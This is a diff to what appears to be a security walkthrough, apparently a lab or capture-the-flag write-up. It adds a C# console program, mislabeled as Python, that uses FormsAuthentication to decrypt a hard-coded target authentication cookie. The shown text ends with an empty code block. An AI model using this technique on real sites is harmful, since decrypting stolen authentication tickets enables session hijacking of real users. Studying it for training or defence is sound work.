@@ -545,4 +545,58 @@ Ill create a console app (.NET framework) project in visual studio
 
 Ill set this as the following value in `app.config`
 
-Ill also make sure to use `System.Configu`
+Ill also make sure to use `System.Configuration` and `System.Web` as my assemblies
+
+```python
+using System;
+using System.Web.Security;
+
+class Program
+{
+    static void Main()
+    {
+        // Self-test: encrypt then decrypt with YOUR key/config
+        var testTicket = new FormsAuthenticationTicket(
+            1, "testuser", DateTime.Now, DateTime.Now.AddMinutes(30),
+            false, "testuserdata"
+        );
+        string encrypted = FormsAuthentication.Encrypt(testTicket);
+        Console.WriteLine("Self-encrypted: " + encrypted);
+
+        try
+        {
+            var decrypted = FormsAuthentication.Decrypt(encrypted);
+            Console.WriteLine("=== Self round-trip SUCCESS ===");
+            Console.WriteLine("Name: " + decrypted.Name);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Self round-trip FAILED: " + ex.Message);
+        }
+
+        Console.WriteLine();
+
+        // Now try the real target cookie
+        string targetCookie = "02F10C26E9C2A046EC8EAB0E8801C42EE962FFD8DC256D3E89B8584FB2382D7F50348ECC50DA297DC4C099F715EB595954FBED677C2AA269BD611F083DBCE41F5BA78FBEA739DE2BC2DD16786B4A95777619C42AC9C4A656DF4FB421B77236D65286EE2C86FC01867BCC13081EB1732FB1E3DF3B34C8D3DB5491C13437F6312E75F7044181BC52A4365E0A6FF407BDB41E23275EF9E26EB826A2169D341E3AF8";
+        try
+        {
+            var ticket = FormsAuthentication.Decrypt(targetCookie);
+            Console.WriteLine("=== Target Decrypt SUCCESS ===");
+            Console.WriteLine("Name: " + ticket.Name);
+            Console.WriteLine("UserData: " + ticket.UserData);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Target Decrypt FAILED: " + ex.Message);
+        }
+
+        Console.ReadLine();
+    }
+}
+```
+
+Ill then use this code and use the `Start` function in visual studio to run it
+
+```python
+
+```
